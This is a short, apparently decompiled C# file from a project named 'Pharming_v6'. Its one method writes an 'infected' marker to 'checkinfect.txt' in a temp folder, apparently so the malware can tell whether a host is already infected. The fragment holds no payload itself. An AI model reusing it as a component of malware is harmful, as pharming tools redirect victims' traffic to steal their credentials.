using System;
using System.IO;
using Microsoft.VisualBasic.CompilerServices;

namespace Pharming_v6;

[StandardModule]
internal sealed class criatxtinfect
{
	public static void criatxtinfect()
	{
		string path = Module1.temp + "\\checkinfect.txt";
		FileStream fileStream = null;
		try
		{
			if (!File.Exists(path))
			{
				fileStream = File.Create(path);
				using (fileStream)
				{
				}
				using StreamWriter streamWriter = new StreamWriter(path);
				streamWriter.Write("infected");
				return;
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}
}
